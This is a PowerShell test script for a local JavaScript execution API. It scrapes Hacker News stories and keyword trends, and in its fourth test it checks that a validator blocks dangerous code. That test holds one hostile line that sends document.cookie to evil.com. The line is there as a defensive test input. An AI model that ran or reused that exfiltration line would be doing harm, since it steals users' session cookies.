# Hacker News JavaScript Execution Test
# This script tests the JavaScript execution API by extracting stories from Hacker News

param(
    [Parameter(Mandatory=$false)]
    [string]$Token = $env:GNOSIS_API_TOKEN,
    
    [Parameter(Mandatory=$false)]
    [string]$BaseUrl = "http://localhost:5678"
)

# Check if token is provided
if (-not $Token) {
    Write-Host "Error: No API token provided!" -ForegroundColor Red
    Write-Host "Usage: .\test_hackernews.ps1 -Token YOUR_TOKEN" -ForegroundColor Yellow
    Write-Host "Or set environment variable: `$env:GNOSIS_API_TOKEN = 'YOUR_TOKEN'" -ForegroundColor Yellow
    exit 1
}

Write-Host "🚀 Testing JavaScript Execution on Hacker News" -ForegroundColor Cyan
Write-Host "=" * 50 -ForegroundColor Cyan

# Set up headers
$headers = @{
    "Authorization" = "Bearer $Token"
    "Content-Type" = "application/json"
}

# Test 1: Basic - Get page title
Write-Host "`n📋 Test 1: Get Page Title" -ForegroundColor Yellow
$body = @{
    url = "https://news.ycombinator.com"
    javascript = "return document.title;"
} | ConvertTo-Json

try {
    $response = Invoke-RestMethod -Uri "$BaseUrl/api/v2/execute" `
        -Method POST -Headers $headers -Body $body
    
    if ($response.success) {
        Write-Host "✅ Success!" -ForegroundColor Green
        Write-Host "   Title: $($response.result)" -ForegroundColor Gray
    } else {
        Write-Host "❌ Failed: $($response.error)" -ForegroundColor Red
    }
} catch {
    Write-Host "❌ Request failed: $_" -ForegroundColor Red
}

# Test 2: Extract top stories
Write-Host "`n📋 Test 2: Extract Top 10 Stories" -ForegroundColor Yellow
$body = @{
    url = "https://news.ycombinator.com"
    javascript = @'
// Extract stories from Hacker News
const stories = [];
const storyRows = document.querySelectorAll('tr.athing');

for (let i = 0; i < Math.min(10, storyRows.length); i++) {
    const story = storyRows[i];
    const nextRow = story.nextElementSibling;
    
    // Get story link and title
    const titleLink = story.querySelector('.titleline > a');
    
    // Get metadata from next row
    const points = nextRow ? nextRow.querySelector('.score') : null;
    const user = nextRow ? nextRow.querySelector('.hnuser') : null;
    const comments = nextRow ? nextRow.querySelector('.subline > a:last-child') : null;
    
    stories.push({
        rank: story.querySelector('.rank')?.textContent || '',
        title: titleLink?.textContent || '',
        url: titleLink?.href || '',
        points: points?.textContent || '0 points',
        user: user?.textContent || 'unknown',
        comments: comments?.textContent || '0 comments'
    });
}

return stories;
'@
    options = @{
        wait_before = 3000
        timeout = 30000
    }
} | ConvertTo-Json -Depth 10

try {
    $response = Invoke-RestMethod -Uri "$BaseUrl/api/v2/execute" `
        -Method POST -Headers $headers -Body $body
    
    if ($response.success) {
        Write-Host "✅ Success! Found $($response.result.Count) stories" -ForegroundColor Green
        
        # Display the stories
        foreach ($story in $response.result) {
            Write-Host "`n$($story.rank) $($story.title)" -ForegroundColor White
            Write-Host "   🔗 $($story.url)" -ForegroundColor Blue
            Write-Host "   📊 $($story.points) by $($story.user)" -ForegroundColor Gray
            Write-Host "   💬 $($story.comments)" -ForegroundColor Gray
        }
    } else {
        Write-Host "❌ Failed: $($response.error)" -ForegroundColor Red
    }
} catch {
    Write-Host "❌ Request failed: $_" -ForegroundColor Red
}

# Test 3: Get trending topics
Write-Host "`n📋 Test 3: Extract Trending Topics" -ForegroundColor Yellow
$body = @{
    url = "https://news.ycombinator.com"
    javascript = @'
// Extract common words from titles to find trends
const titles = Array.from(document.querySelectorAll('.titleline > a'))
    .map(link => link.textContent.toLowerCase());

// Common tech-related words to look for
const keywords = ['ai', 'llm', 'gpt', 'google', 'apple', 'microsoft', 
                  'python', 'javascript', 'rust', 'react', 'database',
                  'security', 'hack', 'open source', 'startup'];

const trends = {};

titles.forEach(title => {
    keywords.forEach(keyword => {
        if (title.includes(keyword)) {
            trends[keyword] = (trends[keyword] || 0) + 1;
        }
    });
});

// Convert to array and sort by count
const sortedTrends = Object.entries(trends)
    .sort((a, b) => b[1] - a[1])
    .map(([keyword, count]) => ({ keyword, count }));

return {
    totalStories: titles.length,
    trends: sortedTrends
};
'@
} | ConvertTo-Json -Depth 10

try {
    $response = Invoke-RestMethod -Uri "$BaseUrl/api/v2/execute" `
        -Method POST -Headers $headers -Body $body
    
    if ($response.success) {
        Write-Host "✅ Success! Analyzed $($response.result.totalStories) stories" -ForegroundColor Green
        
        if ($response.result.trends.Count -gt 0) {
            Write-Host "`nTrending topics:" -ForegroundColor White
            foreach ($trend in $response.result.trends) {
                Write-Host "   🔥 $($trend.keyword): $($trend.count) mentions" -ForegroundColor Yellow
            }
        } else {
            Write-Host "   No trending keywords found" -ForegroundColor Gray
        }
    } else {
        Write-Host "❌ Failed: $($response.error)" -ForegroundColor Red
    }
} catch {
    Write-Host "❌ Request failed: $_" -ForegroundColor Red
}

# Test 4: Test validation with dangerous code
Write-Host "`n📋 Test 4: Validate Dangerous Code (Should Fail)" -ForegroundColor Yellow
$body = @{
    javascript = "fetch('https://evil.com', {body: document.cookie});"
} | ConvertTo-Json

try {
    $response = Invoke-RestMethod -Uri "$BaseUrl/api/v2/validate" `
        -Method POST -Headers $headers -Body $body
    
    if ($response.is_safe -eq $false) {
        Write-Host "✅ Correctly blocked dangerous code!" -ForegroundColor Green
        Write-Host "   Violations: $($response.violations -join ', ')" -ForegroundColor Yellow
    } else {
        Write-Host "❌ Warning: Dangerous code was not blocked!" -ForegroundColor Red
    }
} catch {
    Write-Host "❌ Request failed: $_" -ForegroundColor Red
}

Write-Host "`n✅ All tests completed!" -ForegroundColor Green
Write-Host "`nExecution time: $($response.metadata.processing_time_ms)ms" -ForegroundColor Cyan